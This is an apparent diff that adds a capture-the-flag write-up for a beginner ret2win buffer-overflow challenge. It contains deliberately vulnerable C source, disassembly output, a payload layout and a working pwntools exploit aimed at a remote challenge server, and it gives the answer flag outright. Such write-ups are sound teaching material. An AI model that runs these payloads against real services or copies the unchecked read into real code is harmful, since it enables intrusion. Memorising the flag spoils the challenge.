@@ -1,0 +1,200 @@
+===========================================================================
+  LYKN CTF - "Return to Lose" (PWN) - Full Writeup
+  Flag: LYKNCTF{97907ee12ae04a298b30bb15d1c863a6}
+  Difficulty: Beginner
+  Category: Binary Exploitation - ret2win
+===========================================================================
+
+1. CHALLENGE OVERVIEW
+----------------------------------------------------------------------------
+
+We are given a 64-bit ELF binary (vuln) and its source code (vuln.c).
+The program asks for a name and prints "Safe travels!" before exiting.
+A function called win() exists that reads and prints flag.txt, but it is
+never called during normal execution. The goal is to hijack the return
+address via buffer overflow to call win().
+
+
+2. SOURCE CODE (vuln.c)
+----------------------------------------------------------------------------
+
+  #include <stdio.h>
+  #include <unistd.h>
+  #include <fcntl.h>
+
+  void win(void) {
+      char flag[128];
+      int fd = open("flag.txt", O_RDONLY);
+      if (fd < 0) {
+          write(1, "flag.txt not found on this server.\n", 35);
+          _exit(1);
+      }
+      ssize_t n = read(fd, flag, sizeof(flag));
+      if (n > 0)
+          write(1, flag, (size_t)n);
+      _exit(0);
+  }
+
+  void vuln(void) {
+      char buf[64];
+      write(1, "What's your name, traveler?\n> ", 30);
+      read(0, buf, 256);                // <-- BUFFER OVERFLOW!
+      write(1, "Safe travels!\n", 14);
+  }
+
+  int main(void) {
+      setvbuf(stdout, NULL, _IONBF, 0);
+      setvbuf(stderr, NULL, _IONBF, 0);
+      vuln();
+      return 0;
+  }
+
+VULNERABILITY: read(0, buf, 256) reads 256 bytes into a 64-byte buffer.
+This overwrites the saved rbp and the return address on the stack.
+
+
+3. BINARY ANALYSIS
+----------------------------------------------------------------------------
+
+  $ file vuln
+  vuln: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+
+  $ checksec --file=vuln
+    Stack Canary: No canary found        <-- No canary: free overflow
+    NX: NX enabled                       <-- Shellcode won't work
+    PIE: No PIE (0x400000)               <-- Fixed addresses, no leak needed
+    RELRO: Partial RELRO
+
+  $ objdump -d vuln | grep "<win>:"
+  00000000004011b6 <win>:               <-- target function address
+
+  $ objdump -d vuln | grep -A30 "<vuln>:"
+  sub    $0x40,%rsp                      ; 64-byte stack allocation
+  lea    -0x40(%rbp),%rax               ; buf at rbp-0x40
+  mov    $0x100,%edx                     ; reads 256 bytes
+  call   read@plt
+  leave
+  ret                                    ; returns to overwritten addr
+
+  $ ROPgadget --binary vuln | grep ": ret$"
+  0x000000000040101a : ret              <-- alignment gadget
+
+
+4. STACK LAYOUT IN vuln()
+----------------------------------------------------------------------------
+
+  Higher addresses
+  +-----------------------+
+  | return address        |  <- rbp+8    (8 bytes)
+  +-----------------------+
+  | saved rbp             |  <- rbp      (8 bytes)
+  +-----------------------+
+  | buf[0..63]            |  <- rbp-0x40 (64 bytes)
+  +-----------------------+
+  Lower addresses (rsp after sub rsp, 0x40)
+
+  Total padding needed = 64 + 8 = 72 bytes
+
+
+5. EXPLOIT STRATEGY
+----------------------------------------------------------------------------
+
+  a) Overflow buf[64] with 72 bytes of padding (64 for buffer + 8 for rbp)
+  b) Place a ret gadget at 0x40101a for 16-byte stack alignment
+  c) Place win() address at 0x4011b6 as the final return target
+  d) win() opens flag.txt, reads it, and writes it to stdout
+
+  STACK ALIGNMENT:
+  On x86-64, the System V ABI requires rsp % 16 == 0 before a call.
+  After a `call` instruction, rsp % 16 == 8. Libc functions like open(),
+  read(), write() use movaps instructions that fault on misaligned stack.
+  The ret gadget pops 8 bytes, realigning rsp to % 16 == 0 before win().
+
+
+6. PAYLOAD STRUCTURE
+----------------------------------------------------------------------------
+
+  Offset  Size  Content
+  ------  ----  -------
+  0       64    'A' * 64          : fill buffer
+  64       8    'A' * 8           : overwrite saved rbp
+  72       8    p64(0x40101a)     : ret gadget (stack alignment)
+  80       8    p64(0x4011b6)     : win() address
+  ---
+  Total: 88 bytes (within the 256-byte read limit)
+
+
+7. EXPLOIT SCRIPT (solve.py)
+----------------------------------------------------------------------------
+
+  from pwn import *
+  import time
+
+  context.arch = 'amd64'
+  context.log_level = 'info'
+
+  win = 0x4011b6
+  ret = 0x40101a
+
+  p = remote('51.79.140.18', 10368)
+  p.recvuntil(b'> ')
+
+  payload = b'A' * 72
+  payload += p64(ret)
+  payload += p64(win)
+
+  p.send(payload)
+  time.sleep(1)
+  flag = p.recv(timeout=3)
+
+  print(f"Flag: {flag.decode().strip()}")
+  p.close()
+
+
+8. REPRODUCTION STEPS
+----------------------------------------------------------------------------
+
+  1. Save solve.py to a working directory
+  2. Install pwntools if needed:  pip install pwntools
+  3. Run:  python3 solve.py
+  4. Output:  Flag: LYKNCTF{97907ee12ae04a298b30bb15d1c863a6}
+
+
+9. TOOLS USED
+----------------------------------------------------------------------------
+
+  pwntools     - Exploit development framework (remote connections, p64)
+  objdump      - Binary disassembly (function addresses, stack size)
+  checksec     - Binary security analysis (canary, PIE, NX, RELRO)
+  ROPgadget    - ROP gadget search (ret alignment gadget)
+  netcat/nc    - Manual service interaction
+
+
+10. COMMON PITFALLS / NOTES
+----------------------------------------------------------------------------
+
+  a) STACK ALIGNMENT
+     Without the ret gadget, win() crashes silently inside open() or
+     write() because movaps requires 16-byte stack alignment. The
+     extra ret pops one quadword, fixing alignment.
+
+  b) CANARY
+     No canary present, which is why the overflow works. Always check
+     checksec first.
+
+  c) PIE
+     No PIE means win() is always at 0x4011b6. No leak required.
+
+  d) NEWLINES / NULL BYTES
+     read() is a raw syscall — it does not stop at newlines or null
+     bytes. The payload can contain any bytes.
+
+  e) NX ENABLED
+     NX prevents executing shellcode on the stack. We use ROP instead
+     (returning to an existing function — ret2win).
+
+
+11. FLAG
+----------------------------------------------------------------------------
+
+  LYKNCTF{97907ee12ae04a298b30bb15d1c863a6}
